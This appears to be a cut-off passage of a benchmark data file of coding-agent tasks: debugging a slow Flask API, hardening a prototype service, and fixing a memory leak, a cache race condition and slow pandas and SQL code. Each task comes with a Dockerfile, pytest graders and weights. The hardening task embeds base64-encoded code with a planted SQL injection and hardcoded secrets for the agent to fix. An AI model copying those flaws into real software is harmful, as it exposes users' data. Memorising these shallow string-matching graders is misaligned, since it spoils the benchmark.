debugging-slow-api-performance-fix,medium,"Fix ""Slow API"" Issue",Multi-Stage Debugging Challenges (Revised),"I'm getting complaints from users that our API running at localhost:5000 is sometimes slow, but the feedback is pretty vague and we don't have any monitoring in place to see what's actually happening. Can you help me investigate what's causing the slowness and fix whatever issues you find? I'd also like you to document what you discover and any changes you make so I can understand what was going wrong.",debugging,debugging|api|performance-optimization|troubleshooting|web,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install flask requests

COPY <<'APPCODE' /app/app.py
from flask import Flask, jsonify, request
import sqlite3
import requests
import json
import os
import time

app = Flask(__name__)

# Initialize database
def init_db():
    conn = sqlite3.connect(""app.db"")
    cursor = conn.cursor()
    cursor.execute(""CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, name TEXT, email TEXT)"")
    cursor.execute(""CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY, message TEXT, timestamp REAL)"")
    cursor.execute(""INSERT OR IGNORE INTO users (id, name, email) VALUES (1, 'John Doe', 'john@example.com')"")
    cursor.execute(""INSERT OR IGNORE INTO users (id, name, email) VALUES (2, 'Jane Smith', 'jane@example.com')"")
    cursor.execute(""INSERT OR IGNORE INTO users (id, name, email) VALUES (3, 'Bob Johnson', 'bob@example.com')"")
    # Insert many log entries to make queries slower
    for i in range(1000):
        cursor.execute(""INSERT OR IGNORE INTO logs (id, message, timestamp) VALUES (?, ?, ?)"", (i, f'Log message {i}', time.time()))
    conn.commit()
    conn.close()

init_db()

@app.route(""/"")
def home():
    # Add unnecessary computation
    result = 0
    for i in range(100000):
        result += i * 2
    return jsonify({""message"": ""Flask API with multiple endpoints"", ""computed"": result})

@app.route(""/users"")
def get_users():
    # Inefficient database queries - N+1 problem
    conn = sqlite3.connect(""app.db"")
    cursor = conn.cursor()
    
    # First get all users
    cursor.execute(""SELECT * FROM users"")
    users = cursor.fetchall()
    
    # Then make separate queries for each user (N+1 problem)
    enriched_users = []
    for user in users:
        # Unnecessary individual queries
        cursor.execute(""SELECT COUNT(*) FROM logs WHERE message LIKE ?"", (f'%{user[1]}%',))
        log_count = cursor.fetchone()[0]
        
        # Add artificial delay for each query
        time.sleep(0.1)
        
        # Inefficient string operations
        processed_name = """"
        for char in user[1]:
            processed_name += char.upper()
        
        enriched_users.append({
            ""id"": user[0],
            ""name"": processed_name,
            ""email"": user[2],
            ""log_count"": log_count
        })
    
    # Another unnecessary query
    cursor.execute(""SELECT COUNT(*) FROM logs"")
    total_logs = cursor.fetchone()[0]
    
    conn.close()
    
    # More unnecessary computation
    fibonacci = [1, 1]
    for i in range(30):
        fibonacci.append(fibonacci[-1] + fibonacci[-2])
    
    return jsonify({""users"": enriched_users, ""total_logs"": total_logs, ""fibonacci"": fibonacci[-1]})

@app.route(""/external"")
def external_api():
    # Multiple blocking external API calls
    results = []
    urls = [
        ""https://jsonplaceholder.typicode.com/posts/1"",
        ""https://jsonplaceholder.typicode.com/posts/2"", 
        ""https://jsonplaceholder.typicode.com/posts/3""
    ]
    
    for url in urls:
        try:
            # Blocking synchronous calls
            time.sleep(0.2)  # Artificial delay
            response = requests.get(url, timeout=10)
            results.append(response.json())
            
            # Unnecessary processing
            for i in range(50000):
                dummy = i ** 2
                
        except:
            results.append({""error"": f""Failed to fetch {url}""})
    
    # Inefficient data processing
    processed_results = []
    for result in results:
        # Convert to string and back (wasteful)
        str_result = json.dumps(result)
        back_to_dict = json.loads(str_result)
        processed_results.append(back_to_dict)
    
    return jsonify({""external_data"": processed_results})

@app.route(""/file"", methods=[""GET"", ""POST""])
def file_operations():
    # File I/O operations with inefficiencies
    if request.method == ""POST"":
        data = request.get_json()
        
        # Write file multiple times unnecessarily
        for i in range(10):
            with open(f""data_{i}.json"", ""w"") as f:
                json.dump(data, f)
            time.sleep(0.05)  # Blocking I/O delay
            
        # Clean up extra files (more I/O)
        for i in range(1, 10):
            try:
                os.remove(f""data_{i}.json"")
            except:
                pass
                
        return jsonify({""message"": ""Data written to file""})
    else:
        try:
            # Read file multiple times
            all_data = []
            for attempt in range(5):
                with open(""data_0.json"", ""r"") as f:
                    data = json.load(f)
                    all_data.append(data)
                time.sleep(0.1)  # Artificial delay
                
            # Inefficient list processing
            final_data = {}
            for item in all_data:
                for key, value in item.items():
                    # Inefficient string concatenation
                    processed_key = """"
                    for char in str(key):
                        processed_key += char
                    final_data[processed_key] = value
                    
            return jsonify({""file_data"": final_data})
        except FileNotFoundError:
            # Even error handling is slow
            time.sleep(0.2)
            error_message = """"
            for char in ""No data file found"":
                error_message += char
            return jsonify({""message"": error_message})

if __name__ == ""__main__"":
    app.run(host=""0.0.0.0"", port=5000)
APPCODE

CMD [""/bin/bash""]","import os
import subprocess
import time
import statistics
import requests
import threading

def test_profiling_implemented():
    """"""Implements measuring/profiling to identify slow operations.""""""
    # Check if app.py has been modified to include ACTUAL profiling code
    with open('/app/app.py', 'r') as f:
        content = f.read()
    
    # Look for actual profiling implementation with timing measurements
    # Must have actual timing code, not just imports
    timing_patterns = [
        'start_time = time.',  # Timing start
        'end_time = time.',    # Timing end
        '- start_time',        # Time calculation
        'elapsed_time',        # Elapsed time variable
        'execution_time',      # Execution time variable
        'took {',              # Formatted timing output
        'Performance metric',  # Performance logging
        'Profile results',     # Profiling results
        '@app.before_request', # Flask request timing
        '@app.after_request'   # Flask request timing
    ]
    
    # Must have at least 2 timing patterns to be considered profiling
    matches = sum(1 for pattern in timing_patterns if pattern in content)
    assert matches >= 2, f""Insufficient profiling implementation found (only {matches} patterns)""
    
    # Also check for actual measurement output/logging
    output_patterns = ['print(', 'app.logger.', 'logging.', 'sys.stdout']
    has_output = any(pattern in content for pattern in output_patterns)
    assert has_output, ""No profiling output/logging mechanism found""

def test_bottlenecks_identified():
    """"""Identifies actual bottlenecks (slow DB queries and sync I/O).""""""
    # Check if documentation identifies the SPECIFIC bottlenecks
    documentation_files = ['README.md', 'PERFORMANCE.md', 'analysis.txt', 'bottlenecks.txt', 
                          'performance_report.txt', 'findings.md', 'issues.txt']
    
    # Must have created documentation
    docs_found = any(os.path.exists(f'/app/{filename}') for filename in documentation_files)
    assert docs_found, ""No documentation files found describing bottlenecks""
    
    # Check documentation content for specific bottleneck identification
    specific_bottlenecks = [
        'n+1',  # N+1 query problem
        'N+1',
        'blocking',  # Blocking I/O
        'synchronous',  # Synchronous API calls
        'inefficient query',
        'unnecessary computation',
        'time.sleep',  # Artificial delays
        'multiple queries',
        'sequential requests',
        'fibonacci calculation',
        'string concatenation'
    ]
    
    bottlenecks_documented = False
    for filename in documentation_files:
        filepath = f'/app/{filename}'
        if os.path.exists(filepath):
            with open(filepath, 'r') as f:
                content = f.read().lower()
                # Must identify at least 3 specific bottlenecks
                matches = sum(1 for bottleneck in specific_bottlenecks if bottleneck.lower() in content)
                if matches >= 3:
                    bottlenecks_documented = True
                    break
    
    assert bottlenecks_documented, ""Specific bottlenecks not properly documented""

def test_performance_improved():
    """"""Fixes improve p95 response time by at least 50%.""""""
    # Start the Flask app in background
    proc = subprocess.Popen(['python', '/app/app.py'], 
                           cwd='/app',
                           stdout=subprocess.PIPE, 
                           stderr=subprocess.PIPE)
    
    # Wait for server to start
    time.sleep(3)
    
    try:
        # Test multiple endpoints to get response times
        endpoints = ['/', '/users', '/external', '/file']
        all_times = []
        
        # Make multiple requests to get statistical data
        for _ in range(20):  # 20 requests for p95 calculation
            for endpoint in endpoints:
                try:
                    start_time = time.perf_counter()
                    response = requests.get(f'http://localhost:5000{endpoint}', timeout=10)
                    end_time = time.perf_counter()
                    
                    if response.status_code == 200:
                        response_time = (end_time - start_time) * 1000  # Convert to ms
                        all_times.append(response_time)
                except:
                    pass  # Skip failed requests
        
        assert len(all_times) >= 10, ""Not enough successful requests""
        
        # Calculate p95 response time
        sorted_times = sorted(all_times)
        p95_index = int(len(sorted_times) * 0.95)
        p95_time = sorted_times[p95_index] if p95_index < len(sorted_times) else sorted_times[-1]
        
        # The original code has many sleep() calls and inefficiencies
        # Without fixes, p95 should be > 500ms
        # With proper fixes, it should be < 250ms (50% improvement)
        assert p95_time < 250, f""p95 time {p95_time:.1f}ms not improved enough (target < 250ms)""
            
    finally:
        # Clean up process
        proc.terminate()
        proc.wait()","{""test_profiling_implemented"": 0.2, ""test_bottlenecks_identified"": 0.25, ""test_performance_improved"": 0.55}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
production-ready-service-hardening,hard,"Make System ""Production-Ready""",Multi-Stage Debugging Challenges (Revised),"I have a prototype service located in `/app/app.py` that I need to make production-ready before we can deploy it. Could you review the code and do whatever you think is necessary to get it ready for a production environment? After you're done, please create a checklist documenting all the changes you made and save it as `/app/production_checklist.md` so I can see what was addressed.",software-engineering,debugging|security|web-server|system|troubleshooting|performance-optimization,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install flask requests

RUN mkdir -p service

# Create the app.py file using base64
RUN echo 'aW1wb3J0IG9zCmltcG9ydCBzcWxpdGUzCmZyb20gZmxhc2sgaW1wb3J0IEZsYXNrLCByZXF1ZXN0LCBqc29uaWZ5CgphcHAgPSBGbGFzayhfX25hbWVfXykKCiMgSGFyZGNvZGVkIHNlY3JldHMgLSBzZWN1cml0eSBmbGF3CkRBVEFCQVNFX1BBU1NXT1JEID0gImFkbWluMTIzIgpBUElfS0VZID0gInNlY3JldF9rZXlfMTIzNDUiCgojIEdsb2JhbCBkYXRhYmFzZSBjb25uZWN0aW9uIC0gcmVzb3VyY2UgbGVhawpkYl9jb25uID0gc3FsaXRlMy5jb25uZWN0KCdhcHAuZGInKQoKQGFwcC5yb3V0ZSgnLycpCmRlZiBob21lKCk6CiAgICByZXR1cm4gIldlbGNvbWUgdG8gdGhlIHByb3RvdHlwZSBzZXJ2aWNlISIKCkBhcHAucm91dGUoJy91c2VycycsIG1ldGhvZHM9WydHRVQnLCAnUE9TVCddKQpkZWYgdXNlcnMoKToKICAgIGlmIHJlcXVlc3QubWV0aG9kID09ICdQT1NUJzoKICAgICAgICBkYXRhID0gcmVxdWVzdC5nZXRfanNvbigpCiAgICAgICAgIyBObyBpbnB1dCB2YWxpZGF0aW9uIC0gc2VjdXJpdHkgZmxhdwogICAgICAgIHVzZXJuYW1lID0gZGF0YVsndXNlcm5hbWUnXQogICAgICAgIHBhc3N3b3JkID0gZGF0YVsncGFzc3dvcmQnXQogICAgICAgIAogICAgICAgICMgRGlyZWN0IFNRTCB4ZWN1dGlvbiB3aXRob3V0IHByb3BlciBlcnJvciBoYW5kbGluZwogICAgICAgIGN1cnNvciA9IGRiX2Nvbm4uY3Vyc29yKCkKICAgICAgICBjdXJzb3IuZXhlY3V0ZShmIklOU0VSVCBJTlRPIHVzZXJzICh1c2VybmFtZSwgcGFzc3dvcmQpIFZBTFVFUyAoJ3t1c2VybmFtZX0nLCAne3Bhc3N3b3JkfScpIikKICAgICAgICBkYl9jb25uLmNvbW1pdCgpCiAgICAgICAgCiAgICAgICAgcmV0dXJuIGpzb25pZnkoeyJtZXNzYWdlIjogIlVzZXIgY3JlYXRlZCJ9KQogICAgCiAgICAjIE5vIGVycm9yIGhhbmRsaW5nIGZvciBkYXRhYmFzZSBvcGVyYXRpb25zCiAgICBjdXJzb3IgPSBkYl9jb25uLmN1cnNvcigpCiAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUICogRlJPTSB1c2VycyIpCiAgICB1c2VycyA9IGN1cnNvci5mZXRjaGFsbCgpCiAgICByZXR1cm4ganNvbmlmeSh1c2VycykKCkBhcHAucm91dGUoJy9kYXRhJykKZGVmIGdldF9kYXRhKCk6CiAgICAjIFBvb3IgcmVzb3VyY2UgbWFuYWdlbWVudCAtIGZpbGUgbm90IGNsb3NlZCBwcm9wZXJseQogICAgZmlsZSA9IG9wZW4oJ2RhdGEudHh0JywgJ3InKQogICAgY29udGVudCA9IGZpbGUucmVhZCgpCiAgICByZXR1cm4gY29udGVudAoKQGFwcC5yb3V0ZSgnL3Byb2Nlc3MnKQpkZWYgcHJvY2Vzc19kYXRhKCk6CiAgICAjIE5vIGVycm9yIGhhbmRsaW5nCiAgICByZXN1bHQgPSAxMCAvIGludChyZXF1ZXN0LmFyZ3MuZ2V0KCdkaXZpc29yJykpCiAgICByZXR1cm4ganNvbmlmeSh7InJlc3VsdCI6IHJlc3VsdH0pCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgIyBDcmVhdGUgZGF0YWJhc2UgdGFibGUgd2l0aG91dCBwcm9wZXIgZXJyb3IgaGFuZGxpbmcKICAgIGN1cnNvciA9IGRiX2Nvbm4uY3Vyc29yKCkKICAgIGN1cnNvci5leGVjdXRlKCcnJ0NSRUFURSBUQUJMRSBJRiBOT1QgRVhJU1RTIHVzZXJzIAogICAgICAgICAgICAgICAgICAgICAoaWQgSU5URUdFUiBQUklNQVJZIEtFWSwgdXNlcm5hbWUgVEVYVCwgcGFzc3dvcmQgVEVYVCknJycpCiAgICBkYl9jb25uLmNvbW1pdCgpCiAgICAKICAgICMgQ3JlYXRlIGRhdGEgZmlsZQogICAgZmlsZSA9IG9wZW4oJ2RhdGEudHh0JywgJ3cnKQogICAgZmlsZS53cml0ZSgnU2FtcGxlIGRhdGEgZm9yIHRoZSBzZXJ2aWNlJykKICAgICMgRmlsZSBub3QgY2xvc2VkIC0gcmVzb3VyY2UgbGVhawogICAgCiAgICBhcHAucnVuKGhvc3Q9JzAuMC4wLjAnLCBwb3J0PTUwMDAsIGRlYnVnPVRydWUpCg==' | base64 -d > service/app.py

EXPOSE 5000

CMD [""python"", ""service/app.py""]","import os
import subprocess
import re

def test_security_hardened():
    """"""Security issues addressed (secrets management, input validation).""""""
    # Check if hardcoded secrets are removed from the main application file
    app_file = '/app/service/app.py'
    
    with open(app_file, 'r') as f:
        app_content = f.read()
    
    # Check that hardcoded passwords/secrets are not in the code
    assert 'DATABASE_PASSWORD = ""admin123""' not in app_content
    assert 'API_KEY = ""secret_key_12345""' not in app_content
    
    # Check for environment variable usage or config file usage
    has_env_vars = 'os.environ' in app_content or 'os.getenv' in app_content
    has_config = 'config' in app_content.lower()
    assert has_env_vars or has_config

def test_reliability_improved():
    """"""Reliability improved (error handling, health checks).""""""
    # Check if the main application file exists and has error handling
    app_file = '/app/service/app.py'
    
    with open(app_file, 'r') as f:
        app_content = f.read()
    
    # Check for error handling (try/except blocks)
    assert 'try:' in app_content and 'except' in app_content
    
    # Check for health check endpoint
    health_patterns = ['/health', '/ping', '/status', 'health', 'ping']
    has_health_check = any(pattern in app_content for pattern in health_patterns)
    assert has_health_check

def test_observability_added():
    """"""Observability added (logging, metrics endpoints).""""""
    # Check if the main application file exists and has logging
    app_file = '/app/service/app.py'
    
    with open(app_file, 'r') as f:
        app_content = f.read()
    
    # Check for logging configuration
    logging_patterns = ['import logging', 'logger', 'log.', 'logging.']
    has_logging = any(pattern in app_content for pattern in logging_patterns)
    assert has_logging
    
    # Check for metrics endpoints
    metrics_patterns = ['/metrics', 'metrics', 'prometheus', 'monitoring']
    has_metrics = any(pattern in app_content for pattern in metrics_patterns)
    assert has_metrics

def test_resources_managed():
    """"""Resource management fixed (connection pools, cleanup).""""""
    # Check if the main application file exists and has proper resource management
    app_file = '/app/service/app.py'
    
    with open(app_file, 'r') as f:
        app_content = f.read()
    
    # Check for proper resource cleanup patterns
    resource_patterns = ['with open', 'with sqlite3', '.close()', 'finally:', 'context manager']
    has_resource_management = any(pattern in app_content for pattern in resource_patterns)
    assert has_resource_management
    
    # Check that resource leaks are fixed (no standalone open() without proper cleanup)
    lines = app_content.split('\n')
    standalone_opens = [line for line in lines if 'open(' in line and 'with' not in line and '=' in line]
    # If there are standalone opens, they should be followed by close() calls
    if standalone_opens:
        assert '.close()' in app_content

def test_checklist_comprehensive():
    """"""Comprehensive checklist documents all improvements.""""""
    # Check if the production checklist file exists
    checklist_path = '/app/production_checklist.md'
    assert os.path.exists(checklist_path)
    
    # Check if the checklist has content
    with open(checklist_path, 'r') as f:
        content = f.read()
    
    assert len(content.strip()) > 0
    
    # Check if the checklist mentions key improvement areas
    content_lower = content.lower()
    improvement_areas = ['security', 'error', 'logging', 'resource', 'health']
    mentioned_areas = sum(1 for area in improvement_areas if area in content_lower)
    assert mentioned_areas >= 3  # At least 3 of the key areas should be mentioned","{""test_security_hardened"": 0.25, ""test_reliability_improved"": 0.2, ""test_observability_added"": 0.2, ""test_resources_managed"": 0.2, ""test_checklist_comprehensive"": 0.15}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
memory-leak-web-service-debugging,easy,Memory Leak After N Requests,Performance Deep Dives,I'm having trouble with a web service located at `/app/leaky_service.py` that keeps running out of memory after handling many requests. Can you help me find what's causing the memory leak and fix it? I'd also like you to verify that your fix actually works by running the stress test that's provided with it.,debugging,debugging|performance-optimization|web-server|python,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install Flask

RUN echo 'from flask import Flask\n\
\n\
app = Flask(__name__)\n\
\n\
# Global list that will cause memory leak\n\
memory_leak_list = []\n\
\n\
@app.route(""/"")\n\
def hello():\n\
    # Append data to global list on each request (memory leak)\n\
    memory_leak_list.append(""data"" * 1000)\n\
    return f""Hello! List size: {len(memory_leak_list)}""\n\
\n\
if __name__ == ""__main__"":\n\
    app.run(host=""0.0.0.0"", port=5000)' > /app/leaky_service.py

RUN echo '#!/bin/bash\n\
\n\
# Stress test script to trigger memory leak\n\
for i in {1..1000}; do\n\
    curl -s http://localhost:5000/ > /dev/null\n\
    echo ""Request $i completed""\n\
done' > /app/stress_test.sh

RUN chmod +x /app/stress_test.sh

CMD [""/bin/bash""]","import os
import subprocess
import time
import signal
import requests

def test_memory_leak_fixed():
    """"""The memory leak is fixed in the Python script.""""""
    # Check both possible locations for the service
    service_files = ['/app/leaky_service.py', '/app/app.py']
    
    service_content = None
    for service_file in service_files:
        if os.path.exists(service_file):
            with open(service_file, 'r') as f:
                service_content = f.read()
            break
    
    assert service_content is not None, ""Service file not found""
    
    # Check if the memory leak pattern is fixed
    # The original leak was: memory_leak_list.append(""data"" * 1000) without clearing
    lines = service_content.split('\n')
    
    has_global_list = any('memory_leak_list = []' in line for line in lines)
    has_append_without_clear = False
    
    if has_global_list:
        # Check if there's still an append without proper clearing
        in_route_function = False
        has_append_in_route = False
        has_clear_in_route = False
        
        for line in lines:
            stripped = line.strip()
            if '@app.route' in stripped:
                in_route_function = True
                has_append_in_route = False
                has_clear_in_route = False
            elif stripped.startswith('def ') and in_route_function:
                continue
            elif in_route_function and stripped.startswith('@'):
                in_route_function = False
            elif in_route_function:
                if 'memory_leak_list.append' in stripped:
                    has_append_in_route = True
                if 'memory_leak_list.clear()' in stripped or 'memory_leak_list = []' in stripped:
                    has_clear_in_route = True
            elif not in_route_function and has_append_in_route and not has_clear_in_route:
                has_append_without_clear = True
                break
        
        if has_append_in_route and not has_clear_in_route:
            has_append_without_clear = True
    
    # Memory leak is fixed if either:
    # 1. The global list is no longer used, OR
    # 2. The global list is properly cleared
    assert not has_append_without_clear or not has_global_list

def _wait_for_server(url, max_attempts=30):
    """"""Wait for server to be ready by checking if it responds to requests.""""""
    for i in range(max_attempts):
        try:
            response = subprocess.run(
                ['curl', '-s', url],
                capture_output=True,
                timeout=2
            )
            if response.returncode == 0:
                return True
        except subprocess.TimeoutExpired:
            pass
        time.sleep(1)
    return False

def test_stress_test_passes():
    """"""The provided stress test script now completes without the service crashing or exceeding memory limits.""""""
    # Start the service in background
    service_files = ['/app/leaky_service.py', '/app/app.py']
    service_file = None
    
    for f in service_files:
        if os.path.exists(f):
            service_file = f
            break
    
    assert service_file is not None, ""Service file not found""
    
    # Start the service
    service_process = subprocess.Popen(
        ['python', service_file],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    
    # Wait for service to be ready
    server_ready = _wait_for_server('http://localhost:5000/')
    assert server_ready, ""Service failed to start or become ready""
    
    try:
        # Run the stress test
        result = subprocess.run(
            ['/app/stress_test.sh'],
            capture_output=True,
            text=True,
            timeout=300  # 5 minute timeout
        )
        
        # Check that stress test completed successfully
        assert result.returncode == 0, f""Stress test failed with return code {result.returncode}""
        
        # Check that service is still running (not crashed)
        assert service_process.poll() is None, ""Service crashed during stress test""
        
    finally:
        # Clean up - terminate the service
        service_process.terminate()
        try:
            service_process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            service_process.kill()","{""test_memory_leak_fixed"": 0.4, ""test_stress_test_passes"": 0.6}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
distributed-cache-consistency-bug-fix,medium,Distributed Cache Consistency Bug,Performance Deep Dives,"I have a buggy cache implementation in /app/cache.py. The update_cache() function has a race condition - it reads and updates values without proper locking, causing lost updates when multiple threads access it concurrently. Please fix this by ensuring the entire read-modify-write operation in update_cache() is atomic using the existing lock.",debugging,debugging|caching|python|performance-optimization|multiprocessing,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Create the buggy cache implementation
RUN echo 'import time' > cache.py && \
    echo 'import threading' >> cache.py && \
    echo '' >> cache.py && \
    echo 'cache_data = {}' >> cache.py && \
    echo 'lock = threading.Lock()' >> cache.py && \
    echo '' >> cache.py && \
    echo 'def update_cache(key, value):' >> cache.py && \
    echo '    # BUG: The check-then-update is not atomic!' >> cache.py && \
    echo '    if key in cache_data:' >> cache.py && \
    echo '        time.sleep(0.001)  # Simulate some processing time' >> cache.py && \
    echo '        old_value = cache_data[key]' >> cache.py && \
    echo '        cache_data[key] = old_value + value' >> cache.py && \
    echo '    else:' >> cache.py && \
    echo '        cache_data[key] = value' >> cache.py && \
    echo '' >> cache.py && \
    echo 'def get_cache(key):' >> cache.py && \
    echo '    return cache_data.get(key, 0)' >> cache.py && \
    echo '' >> cache.py && \
    echo 'def clear_cache():' >> cache.py && \
    echo '    cache_data.clear()' >> cache.py

CMD [""/bin/bash""]","import subprocess
import sys

def test_race_condition_fixed():
    """"""Verify that concurrent updates don't lose data due to race conditions.""""""
    # This test creates many threads that all try to increment the same counter
    # Without proper locking, some increments will be lost
    test_script = '''
import sys
sys.path.append('/app')
import cache
import threading

# Test parameters designed to reliably expose race conditions
NUM_THREADS = 50
INCREMENTS_PER_THREAD = 100
EXPECTED_TOTAL = NUM_THREADS * INCREMENTS_PER_THREAD

# Run multiple trials to ensure race condition would be detected
for trial in range(3):
    cache.clear_cache()
    
    def increment_counter():
        for _ in range(INCREMENTS_PER_THREAD):
            cache.update_cache('counter', 1)
    
    # Create and start all threads
    threads = [threading.Thread(target=increment_counter) for _ in range(NUM_THREADS)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    
    # Check the result
    actual = cache.get_cache('counter')
    if actual != EXPECTED_TOTAL:
        print(f""Trial {trial + 1}: Race condition detected! Expected {EXPECTED_TOTAL}, got {actual}"")
        print(f""Lost {EXPECTED_TOTAL - actual} updates due to race condition"")
        sys.exit(1)

print(f""All trials passed. Counter correctly reached {EXPECTED_TOTAL} in all trials."")
sys.exit(0)
'''
    
    result = subprocess.run(
        [sys.executable, '-c', test_script],
        capture_output=True,
        text=True,
        timeout=30
    )
    
    assert result.returncode == 0, f""Race condition not fixed! {result.stdout}""","{""test_race_condition_fixed"": 1.0}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
data-processing-script-performance-optimization,easy,Script Running Too Slowly (Revised),,"I have a data processing script at `/app/process_data.py` that works on the dataset located at `/app/dataset.csv`, but it's running way too slowly - taking over a minute to complete. I need you to optimize it so it runs in under 5 seconds while keeping the final output exactly the same. Could you also document whatever changes you make in `/app/optimization_notes.txt`?",software-engineering,performance-optimization|data-processing|python|optimization|debugging,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install pandas for the inefficient script
RUN pip install pandas

# Create the inefficient Python script
COPY <<'PYCODE' /app/process_data.py
import pandas as pd
import time

def calculate_stuff():
    """"""Inefficient script with obvious bottlenecks""""""
    # Read CSV file
    df = pd.read_csv('/app/dataset.csv')
    
    # Bottleneck 1: Row-by-row iteration instead of vectorized operations
    results = []
    for index, row in df.iterrows():
        # Inefficient calculation that should be vectorized
        result = row['value1'] * 2 + row['value2'] * 3
        results.append(result)
    
    # Bottleneck 2: Appending to list in loop instead of vectorized operation
    processed_values = []
    for i in range(len(df)):
        if df.iloc[i]['value1'] > 50:
            processed_values.append(df.iloc[i]['value1'] * df.iloc[i]['value2'])
        else:
            processed_values.append(0)
    
    # Bottleneck 3: Using iterrows() for filtering
    filtered_data = []
    for index, row in df.iterrows():
        if row['value2'] > 25:
            filtered_data.append(row.to_dict())
    
    # Save main output without timing
    output_lines = [
        f""Processed {len(df)} rows"",
        f""Results count: {len(results)}"",
        f""Filtered data count: {len(filtered_data)}""
    ]
    
    for line in output_lines:
        print(line)

if __name__ == ""__main__"":
    start_time = time.time()
    calculate_stuff()
    end_time = time.time()
    print(f""Execution time: {end_time - start_time:.2f} seconds"")
PYCODE

RUN cp /app/process_data.py /app/inefficient_script.py

# Generate CSV file with 100,000 rows
COPY <<'CSVGEN' /tmp/generate_csv.py
import csv
import random

with open('/app/dataset.csv', 'w', newline='') as csvfile:
    fieldnames = ['id', 'value1', 'value2', 'category']
    writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
    
    writer.writeheader()
    for i in range(100000):
        writer.writerow({
            'id': i + 1,
            'value1': random.randint(1, 100),
            'value2': random.randint(1, 100),
            'category': random.choice(['A', 'B', 'C', 'D'])
        })
CSVGEN

RUN python3 /tmp/generate_csv.py && rm /tmp/generate_csv.py

CMD [""/bin/bash""]","import os
import subprocess
import time
import re

def test_bottleneck_identified():
    """"""The agent uses profiling or code analysis to identify the bottleneck.""""""
    assert os.path.exists(""/app/optimization_notes.txt""), ""Optimization notes file not found""
    
    with open(""/app/optimization_notes.txt"", ""r"") as f:
        content = f.read().lower()
    
    # Check for evidence of bottleneck identification
    bottleneck_indicators = [
        ""iterrows"", ""bottleneck"", ""inefficient"", ""loop"", ""vectoriz"", 
        ""performance"", ""slow"", ""optimization"", ""profil""
    ]
    
    found_analysis = any(indicator in content for indicator in bottleneck_indicators)
    assert found_analysis, ""No evidence of bottleneck analysis found in optimization notes""

def test_efficient_algorithms_used():
    """"""The script is refactored using more efficient algorithms (e.g., pandas vectorization).""""""
    assert os.path.exists(""/app/process_data.py""), ""Optimized script not found at /app/process_data.py""
    
    with open(""/app/process_data.py"", ""r"") as f:
        script_content = f.read()
    
    # Check that inefficient patterns are not present
    assert ""iterrows()"" not in script_content, ""Script still uses inefficient iterrows() method""
    assert "".iloc["" not in script_content or script_content.count("".iloc["") < 5, ""Script uses too many iloc operations""
    
    # Check for vectorized operations indicators
    vectorization_indicators = [""*"", ""+"", "">"", ""<"", "">="", ""<="", ""=="", ""!=""]
    pandas_methods = ["".loc["", "".query("", "".apply("", "".map("", "".where(""]
    
    has_vectorization = any(indicator in script_content for indicator in vectorization_indicators)
    has_pandas_methods = any(method in script_content for method in pandas_methods)
    
    assert has_vectorization or has_pandas_methods, ""No evidence of vectorized operations found""

def test_performance_target_met():
    """"""The optimized script runs in under 5 seconds and produces an output identical to the original.""""""
    assert os.path.exists(""/app/process_data.py""), ""Optimized script not found""
    assert os.path.exists(""/app/dataset.csv""), ""Dataset not found""
    
    # Run original inefficient script
    original_result = subprocess.run(
        [""python3"", ""/app/inefficient_script.py""],
        capture_output=True,
        text=True,
        cwd=""/app""
    )
    assert original_result.returncode == 0, ""Original script failed to run""
    
    # Run optimized script and measure time
    start_time = time.time()
    optimized_result = subprocess.run(
        [""python3"", ""/app/process_data.py""],
        capture_output=True,
        text=True,
        cwd=""/app""
    )
    end_time = time.time()
    
    assert optimized_result.returncode == 0, ""Optimized script failed to run""
    
    execution_time = end_time - start_time
    assert execution_time < 5.0, f""Script took {execution_time:.2f} seconds, exceeding 5 second target""
    
    # Filter out timing lines and compare full stdout
    def filter_timing_lines(output):
        lines = output.strip().split('\n')
        filtered_lines = []
        for line in lines:
            # Skip lines that contain timing information
            if not any(timing_word in line.lower() for timing_word in ['time', 'seconds', 'elapsed', 'duration']):
                filtered_lines.append(line)
        return '\n'.join(filtered_lines)
    
    original_output = filter_timing_lines(original_result.stdout)
    optimized_output = filter_timing_lines(optimized_result.stdout)
    
    assert original_output == optimized_output, f""Script outputs differ:\nOriginal:\n{original_output}\nOptimized:\n{optimized_output}""","{""test_bottleneck_identified"": 0.2, ""test_efficient_algorithms_used"": 0.35, ""test_performance_target_met"": 0.45}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
database-query-optimization-performance,hard,Database Query Optimization (Revised),,"I have a SQL query in `/app/slow_query.sql` that's taking over 30 seconds to run on our database, which is way too slow for our application. I need you to help me optimize it to run in under 1 second. The catch is that I can't change the database schema at all - no adding indexes or modifying tables - but I can rewrite the query itself. Once you've optimized it, could you also create an explanation in `/app/optimization_report.md` that details why your new version is faster than the original?",software-engineering,optimization|performance-optimization|data|analysis|troubleshooting,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

# Install PostgreSQL
RUN apt-get update && apt-get install -y \
    postgresql \
    postgresql-contrib \
    && rm -rf /var/lib/apt/lists/*

# Setup PostgreSQL
USER postgres
RUN /etc/init.d/postgresql start && \
    psql --command ""CREATE USER testuser WITH SUPERUSER PASSWORD 'testpass';"" && \
    createdb -O testuser testdb

# Create tables with moderately-sized data
RUN /etc/init.d/postgresql start && \
    psql -d testdb -c ""CREATE TABLE users (id SERIAL PRIMARY KEY, name VARCHAR(100), email VARCHAR(100));"" && \
